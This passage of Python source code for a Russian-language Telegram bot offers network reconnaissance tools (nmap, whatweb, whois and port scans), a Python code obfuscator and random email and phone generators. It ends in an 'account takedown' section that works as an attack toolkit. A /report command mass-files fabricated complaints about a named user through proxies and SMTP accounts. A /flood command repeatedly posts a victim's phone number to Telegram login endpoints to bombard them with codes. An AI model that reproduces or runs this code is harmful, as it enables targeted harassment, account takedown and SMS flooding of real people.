        ("WHATWEB", f"whatweb http://{domain} --color=never"),
        ("NMAP", f"nmap -F {domain}")
    ]
    
    results = []
    
    for name, cmd in commands:
        await message.answer(f"Выполняю {name}...")
        result = await run_command_safe(cmd)
        
        if not result.strip():
            result = "Нет данных"
        
        if len(result) > 1000:
            result = result[:1000] + "\n... (обрезано)"
        
        results.append(f"{name}:\n```\n{result}\n```")
    
    full_result = "\n\n".join(results)
    
    if len(full_result) > 4000:
        parts = []
        current_part = ""
        
        for section in results:
            if len(current_part) + len(section) > 4000:
                parts.append(current_part)
                current_part = section
            else:
                current_part += "\n\n" + section
        
        if current_part:
            parts.append(current_part)
        
        for i, part in enumerate(parts):
            await message.answer(f"Результаты сканирования {domain} (часть {i+1}/{len(parts)}):\n{part}", parse_mode='Markdown')
    else:
        await message.answer(f"Результаты полного сканирования {domain}:\n{full_result}", parse_mode='Markdown')
    
    await db.save_website_scan(
        user_id=message.from_user.id,
        target=domain,
        whois_result=results[0][:500] if len(results) > 0 else "",
        nslookup_result=results[1][:500] if len(results) > 1 else "",
        dig_result=results[2][:500] if len(results) > 2 else "",
        whatweb_result=results[3][:500] if len(results) > 3 else "",
        nmap_result=results[4][:500] if len(results) > 4 else ""
    )

@dp.message(F.text)
async def handle_ip_scan(message: Message):
    if message.text.startswith('/'):
        return
    
    user_id = message.from_user.id
    
    text = message.text.strip()
    
    is_possible_ip = False
    
    try:
        socket.inet_aton(text)
        is_possible_ip = True
    except:
        try:
            socket.inet_pton(socket.AF_INET6, text)
            is_possible_ip = True
        except:
            if '.' in text and not text[0].isdigit():
                is_possible_ip = True
    
    if not is_possible_ip:
        return
    
    await db.log_command(user_id, "ip_scan_auto")
    
    progress_msg = await message.answer(f"Сканирую {text}...")
    
    try:
        result = await scan_ip_address(text, message.from_user.id)
        await progress_msg.edit_text(result, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in IP scan: {e}")
        await progress_msg.edit_text(f"Ошибка при сканировании: {str(e)[:200]}")

async def scan_ip_address(target: str, user_id: int) -> str:
    results = []
    original_target = target
    
    try:
        if not all(part.isdigit() or part == '.' for part in target.replace(':', '')):
            ip_address = socket.gethostbyname(target)
            results.append(f"Домен: <code>{target}</code> -> IP: <code>{ip_address}</code>")
            target = ip_address
        else:
            ip_address = target
            results.append(f"IP адрес: <code>{target}</code>")
    except Exception as e:
        results.append(f"Ошибка разрешения домена: {str(e)}")
        return "\n".join(results)
    
    try:
        geo_data = get_geolocation(ip_address)
        if geo_data:
            results.append(f"\nГЕОЛОКАЦИЯ")
            results.append(f"   Страна: {geo_data.get('country', 'N/A')} ({geo_data.get('country_code', 'N/A')})")
            results.append(f"   Регион: {geo_data.get('region', 'N/A')}")
            results.append(f"   Город: {geo_data.get('city', 'N/A')}")
            results.append(f"   Провайдер: {geo_data.get('isp', 'N/A')}")
            results.append(f"   Организация: {geo_data.get('org', 'N/A')}")
            
            if geo_data.get('lat') and geo_data.get('lon'):
                maps_url = f"https://www.google.com/maps?q={geo_data['lat']},{geo_data['lon']}"
                results.append(f"   Карта: {maps_url}")
    except Exception as e:
        results.append(f"Ошибка геолокации: {str(e)}")
    
    try:
        whois_result = run_cmd(f"whois {ip_address}")
        if whois_result and "Error" not in whois_result:
            whois_lines = whois_result.split('\n')
            key_info = []
            for line in whois_lines:
                line_lower = line.lower()
                if any(keyword in line_lower for keyword in ['netname', 'country', 'created', 'changed', 'descr', 'organization']):
                    key_info.append(line.strip())
            
            if key_info:
                results.append(f"\nWHOIS (кратко)")
                for info in key_info[:8]:
                    results.append(f"   {info}")
    except Exception as e:
        pass
    
    try:
        ping_result = run_cmd(f"ping -c 2 -W 1 {ip_address}")
        if "1 received" in ping_result or "ttl=" in ping_result.lower():
            import re
            time_match = re.search(r'time=([\d.]+)', ping_result)
            if time_match:
                results.append(f"\nPING: Доступен, время {time_match.group(1)}ms")
            else:
                results.append(f"\nPING: Доступен")
        else:
            results.append(f"\nPING: Недоступен")
    except Exception as e:
        results.append(f"\nPING: Ошибка проверки")
    
    try:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        open_ports = []
        
        for port in [80, 443, 22]:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip_address, port))
            sock.close()
            
            if result == 0:
                if port == 80:
                    open_ports.append("80 (HTTP)")
                elif port == 443:
                    open_ports.append("443 (HTTPS)")
                elif port == 22:
                    open_ports.append("22 (SSH)")
        
        if open_ports:
            results.append(f"\nОТКРЫТЫЕ ПОРТЫ: {', '.join(open_ports)}")
        else:
            results.append(f"\nОТКРЫТЫЕ ПОРТЫ: Основные порты закрыты")
    except Exception as e:
        pass
    
    try:
        nslookup_result = run_cmd(f"nslookup {original_target}")
        if nslookup_result and "can't find" not in nslookup_result.lower():
            lines = nslookup_result.split('\n')
            dns_info = []
            for line in lines:
                if 'Address' in line or 'Name' in line:
                    dns_info.append(line.strip())
            
            if dns_info:
                results.append(f"\nDNS ЗАПИСИ")
                for info in dns_info[:4]:
                    results.append(f"   {info}")
    except Exception as e:
        pass
    
    try:
        traceroute_result = run_cmd(f"traceroute -m 1 -q 1 -w 1 {ip_address}")
        if traceroute_result:
            lines = traceroute_result.split('\n')
            if len(lines) > 1:
                first_hop = lines[1].strip() if len(lines) > 1 else lines[0].strip()
                results.append(f"\nПЕРВЫЙ ХОП: {first_hop[:100]}")
    except Exception as e:
        pass
    
    try:
        await db.save_ip_scan(
            user_id=user_id,
            ip_address=ip_address,
            scan_result="\n".join(results)[:500]
        )
    except:
        pass
    
    scan_time = datetime.now().strftime("%H:%M:%S")
    results.append(f"\nСканирование завершено в {scan_time}")
    
    return "\n".join(results)

def get_geolocation(ip_address: str) -> Dict:
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'country': data.get('country', 'N/A'),
                    'country_code': data.get('countryCode', 'N/A'),
                    'region': data.get('regionName', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'isp': data.get('isp', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'timezone': data.get('timezone', 'N/A')
                }
    except Exception as e:
        logger.error(f"Geolocation error: {e}")
    
    return None

@dp.callback_query(F.data == "menu_obfuscator")
async def obfuscator_menu_callback(callback: CallbackQuery):
    obfuscator_text = """
Обфускатор Python кода

Отправьте Python файл для обфускации.

Поддерживаемые методы:

1. Marshal + Reverse
2. Zlib + Reverse
3. Base16 + Reverse
4. Base32 + Reverse
5. Base64 + Reverse
6. Zlib + Base16 + Reverse
7. Zlib + Base32 + Reverse
8. Zlib + Base64 + Reverse
9. Marshal + Zlib + Reverse
10. Marshal + Base16 + Reverse
11. Marshal + Base32 + Reverse
12. Marshal + Base64 + Reverse
13. Marshal + Zlib + Base16 + Reverse
14. Marshal + Zlib + Base32 + Reverse
15. Marshal + Zlib + Base64 + Reverse

Чем выше номер метода, тем сильнее обфускация.

Рекомендуемые методы: 13, 14, 15

Для начала отправьте Python файл.
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отправить файл", callback_data="start_obfuscation")],
        [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
    ])
    
    await callback.message.edit_text(obfuscator_text, reply_markup=keyboard)

@dp.callback_query(F.data == "start_obfuscation")
async def start_obfuscation_callback(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "Отправьте Python файл для обфускации.\n\n"
        "Файл должен быть в формате .py\n"
        "Максимальный размер: 1 МБ\n\n"
        "Для отмены введите /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="menu_obfuscator")]
        ])
    )
    
    await state.set_state(ObfuscatorStates.waiting_for_file)

@dp.message(ObfuscatorStates.waiting_for_file, F.document)
async def process_obfuscation_file(message: Message, state: FSMContext):
    if not message.document.file_name.endswith('.py'):
        await message.answer("Файл должен быть в формате .py")
        return
    
    if message.document.file_size > 1 * 1024 * 1024:
        await message.answer("Файл слишком большой. Максимальный размер: 1 МБ")
        return
    
    await state.update_data(file_id=message.document.file_id, file_name=message.document.file_name)
    
    methods_text = """
Выберите метод обфускации:

1-5: Базовые методы
6-8: Средняя защита
9-12: Хорошая защита
13-15: Максимальная защита

Рекомендуется использовать методы 13-15.

Введите номер метода (1-15):
"""
    
    await message.answer(methods_text)
    await state.set_state(ObfuscatorStates.waiting_for_method)

@dp.message(ObfuscatorStates.waiting_for_file, F.text == "/cancel")
async def cancel_obfuscation(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Обфускация отменена.", reply_markup=await main_menu())

@dp.message(ObfuscatorStates.waiting_for_method)
async def process_obfuscation_method(message: Message, state: FSMContext):
    try:
        method = int(message.text.strip())
        if method < 1 or method > 15:
            await message.answer("Метод должен быть от 1 до 15")
            return
        
        await state.update_data(method=method)
        
        await message.answer("Введите количество циклов шифрования (1-5):\n\nРекомендуется 2-3 цикла.")
        await state.set_state(ObfuscatorStates.waiting_for_loops)
        
    except ValueError:
        await message.answer("Введите число от 1 до 15")

@dp.message(ObfuscatorStates.waiting_for_loops)
async def process_obfuscation_loops(message: Message, state: FSMContext):
    try:
        loops = int(message.text.strip())
        if loops < 1:
            loops = 1
        if loops > 5:
            loops = 5
            await message.answer("Установлено максимальное значение: 5 циклов")
        
        data = await state.get_data()
        file_id = data['file_id']
        file_name = data['file_name']
        method = data['method']
        
        await message.answer("Скачиваю файл...")
        
        file = await bot.get_file(file_id)
        file_path = file.file_path
        
        temp_dir = "temp_obfuscation"
        os.makedirs(temp_dir, exist_ok=True)
        
        input_file = os.path.join(temp_dir, file_name)
        output_file = os.path.join(temp_dir, file_name.replace('.py', '_obfuscated.py'))
        
        await bot.download_file(file_path, input_file)
        
        with open(input_file, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        await message.answer(f"Обрабатываю файл {file_name}...\nМетод: {method}, Циклы: {loops}")
        
        try:
            obfuscated_code = obfuscate_code(file_content, method, loops)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(obfuscated_code)
            
            with open(output_file, 'rb') as f:
                await bot.send_document(
                    chat_id=message.chat.id,
                    document=FSInputFile(output_file, filename=file_name.replace('.py', '_obfuscated.py')),
                    caption=f"Обфусцированный файл\nМетод: {method}, Циклы: {loops}\nИсходный размер: {len(file_content)} байт\nОбфусцированный размер: {len(obfuscated_code)} байт"
                )
            
            await db.save_obfuscation(
                user_id=message.from_user.id,
                original_file=file_name,
                obfuscated_file=file_name.replace('.py', '_obfuscated.py'),
                method=method,
                loops=loops
            )
            
            try:
                os.remove(input_file)
                os.remove(output_file)
                if os.path.exists(temp_dir) and not os.listdir(temp_dir):
                    os.rmdir(temp_dir)
            except:
                pass
            
            await message.answer("Обфускация завершена успешно!")
            
        except Exception as e:
            logger.error(f"Error during obfuscation: {e}")
            await message.answer(f"Ошибка при обфускации: {str(e)[:200]}")
        
    except ValueError:
        await message.answer("Введите число от 1 до 5")
    except Exception as e:
        logger.error(f"Error in obfuscation process: {e}")
        await message.answer(f"Ошибка: {str(e)[:200]}")
    
    await state.clear()

@dp.callback_query(F.data == "menu_stickers")
async def stickers_menu_callback(callback: CallbackQuery):
    try:
        sticker_files = [f for f in os.listdir(STICKERS_DIR) if f.lower().endswith(('.png', '.jpg', '.jpeg', '.webp', '.tgs'))]
        
        if not sticker_files:
            text = "В папке стикеров пока нет файлов.\n\nЗагрузите стикеры в папку 'stickers' в формате PNG, JPG или TGS."
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", callback_data="useful_menu")]
            ])
        else:
            text = f"Доступно стикеров: {len(sticker_files)}\n\nВыберите стикер для отправки:"
            
            keyboard_buttons = []
            row = []
            for i, sticker_file in enumerate(sticker_files):
                row.append(InlineKeyboardButton(
                    text=f"Стикер {i+1}",
                    callback_data=f"send_sticker_{sticker_file}"
                ))
                if len(row) == 3:
                    keyboard_buttons.append(row)
                    row = []
            
            if row:
                keyboard_buttons.append(row)
            
            keyboard_buttons.append([InlineKeyboardButton(text="Назад", callback_data="useful_menu")])
            keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
        
        await callback.message.edit_text(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Error loading stickers: {e}")
        await callback.message.edit_text(
            f"Ошибка при загрузке стикеров: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", callback_data="useful_menu")]
            ])
        )

@dp.callback_query(F.data.startswith("send_sticker_"))
async def send_sticker_callback(callback: CallbackQuery):
    sticker_file = callback.data.replace("send_sticker_", "")
    sticker_path = os.path.join(STICKERS_DIR, sticker_file)
    
    if not os.path.exists(sticker_path):
        await callback.answer("Стикер не найден!", show_alert=True)
        return
    
    try:
        with open(sticker_path, 'rb') as f:
            if sticker_file.lower().endswith('.tgs'):
                await bot.send_sticker(
                    chat_id=callback.message.chat.id,
                    sticker=FSInputFile(sticker_path)
                )
            else:
                await bot.send_photo(
                    chat_id=callback.message.chat.id,
                    photo=FSInputFile(sticker_path),
                    caption=f"Стикер: {sticker_file}"
                )
        await callback.answer("Стикер отправлен!")
    except Exception as e:
        logger.error(f"Error sending sticker: {e}")
        await callback.answer(f"Ошибка отправки: {str(e)[:50]}", show_alert=True)

@dp.callback_query(F.data == "menu_files")
async def files_menu_callback(callback: CallbackQuery):
    try:
        files = [f for f in os.listdir(FILES_DIR) if os.path.isfile(os.path.join(FILES_DIR, f))]
        
        if not files:
            text = "В папке файлов пока нет файлов.\n\nЗагрузите файлы в папку 'files'"
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", callback_data="useful_menu")]
            ])
        else:
            text = f"Доступно файлов: {len(files)}\n\nВыберите файл для скачивания:"
            
            keyboard_buttons = []
            for i, file in enumerate(files):
                file_size = os.path.getsize(os.path.join(FILES_DIR, file))
                size_mb = file_size / (1024 * 1024)
                
                keyboard_buttons.append([
                    InlineKeyboardButton(
                        text=f"Файл: {file} ({size_mb:.1f} MB)",
                        callback_data=f"send_file_{file}"
                    )
                ])
            
            keyboard_buttons.append([InlineKeyboardButton(text="Назад", callback_data="useful_menu")])
            keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
        
        await callback.message.edit_text(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Error loading files: {e}")
        await callback.message.edit_text(
            f"Ошибка при загрузке файлов: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", callback_data="useful_menu")]
            ])
        )

@dp.callback_query(F.data.startswith("send_file_"))
async def send_file_callback(callback: CallbackQuery):
    file_name = callback.data.replace("send_file_", "")
    file_path = os.path.join(FILES_DIR, file_name)
    
    if not os.path.exists(file_path):
        await callback.answer("Файл не найден!", show_alert=True)
        return
    
    try:
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            await callback.answer("Файл слишком большой (>50MB)!", show_alert=True)
            return
        
        await bot.send_document(
            chat_id=callback.message.chat.id,
            document=FSInputFile(file_path),
            caption=f"Файл: {file_name}"
        )
        await callback.answer("Файл отправлен!")
    except Exception as e:
        logger.error(f"Error sending file: {e}")
        await callback.answer(f"Ошибка отправки: {str(e)[:50]}", show_alert=True)

@dp.message(Command("generate_email"))
async def generate_email_cmd(message: Message):
    await db.log_command(message.from_user.id, "generate_email")
    
    args = message.text.split()
    count = 5
    
    if len(args) >= 2:
        try:
            count = int(args[1])
            if count > 20:
                count = 20
                await message.answer("Максимум 20 email адресов. Сгенерирую 20.")
        except:
            pass
    
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru", "yandex.ru", "protonmail.com"]
    emails = []
    
    for i in range(count):
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 12)))
        domain = random.choice(domains)
        emails.append(f"{username}@{domain}")
    
    result = f"Сгенерировано {len(emails)} email адресов:\n\n" + "\n".join(emails)
    await message.answer(f"<pre>{result}</pre>")

@dp.message(Command("generate_phone"))
async def generate_phone_cmd(message: Message):
    await db.log_command(message.from_user.id, "generate_phone")
    
    args = message.text.split()
    count = 5
    
    if len(args) >= 2:
        try:
            count = int(args[1])
            if count > 10:
                count = 10
                await message.answer("Максимум 10 номеров. Сгенерирую 10.")
        except:
            pass
    
    country_formats = {
        '+7': ['9##', '###', '##', '##'],
        '+1': ['###', '###', '####'],
        '+44': ['7###', '######'],
        '+49': ['###', '######'],
        '+33': ['#', '##', '##', '##', '##'],
        '+86': ['###', '####', '####'],
        '+91': ['###', '###', '####'],
        '+55': ['##', '#####', '####']
    }
    
    phones = []
    for i in range(count):
        country_code = random.choice(list(country_formats.keys()))
        format_parts = country_formats[country_code]
        
        phone_number = country_code
        for part in format_parts:
            number_part = ''
            for char in part:
                if char == '#':
                    number_part += str(random.randint(0, 9))
                else:
                    number_part += char
            phone_number += number_part
        
        phones.append(phone_number)
    
    result = f"Сгенерировано {len(phones)} номеров:\n\n" + "\n".join(phones)
    await message.answer(f"<pre>{result}</pre>")

@dp.message(Command("generate_pass"))
async def generate_pass_cmd(message: Message):
    await db.log_command(message.from_user.id, "generate_pass")
    
    args = message.text.split()
    
    length = 12
    count = 5
    
    if len(args) >= 2:
        try:
            length = int(args[1])
            if length > 50:
                length = 50
                await message.answer("Максимальная длина 50. Установлено 50.")
        except:
            pass
    
    if len(args) >= 3:
        try:
            count = int(args[2])
            if count > 20:
                count = 20
                await message.answer("Максимум 20 паролей. Сгенерирую 20.")
        except:
            pass
    
    passwords = []
    characters = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    for i in range(count):
        password = ''.join(random.choices(characters, k=length))
        passwords.append(password)
    
    result = f"Сгенерировано {len(passwords)} паролей (длина: {length}):\n\n" + "\n".join([f"{i+1}. {pwd}" for i, pwd in enumerate(passwords)])
    await message.answer(f"<pre>{result}</pre>")

@dp.message(Command("check_port"))
async def check_port_cmd(message: Message):
    await db.log_command(message.from_user.id, "check_port")
    
    args = message.text.split()
    if len(args) < 3:
        await message.answer("Использование: /check_port IP порт\nПример: /check_port 8.8.8.8 80")
        return
    
    ip = args[1]
    port = args[2]
    
    try:
        port_num = int(port)
        if not 1 <= port_num <= 65535:
            await message.answer("Порт должен быть от 1 до 65535")
            return
    except:
        await message.answer("Порт должен быть числом")
        return
    
    await message.answer(f"Проверяю порт {port} на {ip}...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        
        result = sock.connect_ex((ip, port_num))
        
        if result == 0:
            await message.answer(f"Порт {port} на {ip} ОТКРЫТ")
        else:
            await message.answer(f"Порт {port} на {ip} ЗАКРЫТ")
        
        sock.close()
    except Exception as e:
        await message.answer(f"Ошибка: {str(e)[:100]}")

@dp.message(Command("myinfo"))
async def myinfo_cmd(message: Message):
    await db.log_command(message.from_user.id, "myinfo")
    
    user = message.from_user
    try:
        db_user = await db.get_user(user.id)
        
        info = f"""
ВАША ИНФОРМАЦИЯ

ID: <code>{user.id}</code>
Имя: {user.first_name or "Не указано"}
Фамилия: {user.last_name or "Не указано"}
Username: @{user.username or "Не указано"}

СТАТИСТИКА
Подписан на канал: {"Да" if db_user and db_user['is_subscribed'] else "Нет"}
Дата регистрации: {db_user['join_date'][:10] if db_user else "Неизвестно"}
Последняя активность: {db_user['last_activity'][:16] if db_user else "Неизвестно"}
"""
        
        await message.answer(info, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in myinfo: {e}")
        await message.answer(f"Ваша информация:\n\nID: <code>{user.id}</code>\nИмя: {user.first_name or 'Не указано'}", parse_mode=ParseMode.HTML)

@dp.message(Command("stats"))
async def stats_cmd(message: Message):
    await db.log_command(message.from_user.id, "stats")
    
    try:
        total_users = await db.count_users()
        active_users = await db.count_active_users(7)
        subscribed_users = await db.count_subscribed()
        
        top_commands = await db.get_top_commands(5)
        commands_text = "\n".join([f"• {cmd['command']}: {cmd['count']} раз" for cmd in top_commands])
        
        stats = f"""
СТАТИСТИКА БОТА

ПОЛЬЗОВАТЕЛИ
• Всего пользователей: {total_users}
• Активных (7 дней): {active_users}
• Подписанных на канал: {subscribed_users}

ПОПУЛЯРНЫЕ КОМАНДЫ
{commands_text}

СИСТЕМА
• Прокси в базе: {len(PROXIES_LIST)}
• Email аккаунтов: {len(senders)}
• Файлов в папке: {len(os.listdir(FILES_DIR)) if os.path.exists(FILES_DIR) else 0}
• Стикеров в папке: {len(os.listdir(STICKERS_DIR)) if os.path.exists(STICKERS_DIR) else 0}
"""
        
        await message.answer(stats, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in stats: {e}")
        await message.answer("Ошибка при получении статистики")

@dp.callback_query(F.data == "menu_attack")
async def attack_menu_callback(callback: CallbackQuery):
    text = """
Снос Telegram

Доступные команды:

/report username telegram_id phone_number - Жалоба на аккаунт
/flood phone_number count - SMS/Call флуд

Примеры:
/report hacker_123 123456789 +79161234567
/flood +79161234567 20

Примечание:
Используйте ответственно. Максимальное количество запросов ограничено.
"""
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="menu_main")]]
    ))

@dp.message(Command("report"))
async def report_cmd(message: Message):
    await db.log_command(message.from_user.id, "report")
    
    args = message.text.split()
    if len(args) < 4:
        await message.answer("Использование: /report username telegram_id phone_number\nПример: /report bad_user 123456789 +79161234567")
        return
    
    username = args[1]
    telegram_id = args[2]
    phone = args[3]
    
    await message.answer(f"Начинаю атаку на {username}...")
    
    complaint_text = f"Hello, Telegram support team, I'd like to report user {username} (ID: {telegram_id}) for violating Telegram's rules. Phone number {phone}"
    
    sent = 0
    for i in range(5):
        proxy = {'http': random.choice(PROXIES_LIST)} if PROXIES_LIST else None
        email_addr = generate_random_email()
        
        complaints = send_complaint(username, telegram_id, phone, email_addr, 1, complaint_text, proxy)
        sent += complaints
        
        for sender_email, sender_password in list(senders.items())[:2]:
            for receiver in receivers[:2]:
                send_email(receiver, sender_email, sender_password, 'Report', complaint_text)
        
        await message.answer(f"Отправлено жалоб: {sent} (цикл {i+1}/5)")
        time.sleep(2)
    
    await message.answer(f"Атака завершена\nОтправлено жалоб: {sent}")

@dp.message(Command("flood"))
async def flood_cmd(message: Message):
    await db.log_command(message.from_user.id, "flood")
    
    args = message.text.split()
    if len(args) < 3:
        await message.answer("Использование: /flood phone_number count\nПример: /flood +79161234567 20")
        return
    
    phone = args[1]
    try:
        count = int(args[2])
        if count > 50:
            count = 50
            await message.answer(f"Ограничение: максимум 10 запросов. Установлено: {count}")
    except:
        await message.answer("Некорректное количество")
        return
    
    await message.answer(f"Начинаю флуд на {phone}...")
    
    TELEGRAM_OAUTH_URLS = [
        'https://oauth.telegram.org/auth/request?bot_id=1852523856',
        'https://translations.telegram.org/auth/request',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146',
        'https://oauth.telegram.org/auth/login?bot_id=366357143',
        'https://oauth.telegram.org/auth/login?bot_id=547043436',
        'https://oauth.telegram.org/auth/login?bot_id=7131017560'
    ]
    
    sent = 0
    for i in range(count):
        user_agent = UserAgent().random
        headers = {'User-Agent': user_agent}
        
        for url in TELEGRAM_OAUTH_URLS:
            try:
                response = requests.post(url, headers=headers, data={'phone': phone}, timeout=5)
                if response.status_code == 200:
                    sent += 1
            except:
                pass
        
        if (i + 1) % 5 == 0:
            await message.answer(f"Отправлено запросов: {i+1}/{count}")
    
    await message.answer(f"Флуд завершен\nЦелевой номер: {phone}\nОтправлено запросов: {sent}")

@dp.message()
async def unknown_command(message: Message):
    if message.text.startswith('/'):
        await message.answer("Неизвестная команда. Используйте /start или /menu")

async def main():
    logger.info("Бот запускается...")
    logger.info(f"Инициализация базы данных: {DB_NAME}")
    logger.info(f"Папка файлов: {FILES_DIR}")
    logger.info(f"Папка стикеров: {STICKERS_DIR}")
    
    await db.init_db()
    
    logger.info("База данных инициализирована")
    logger.info(f"Администраторы: {ADMIN_IDS}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
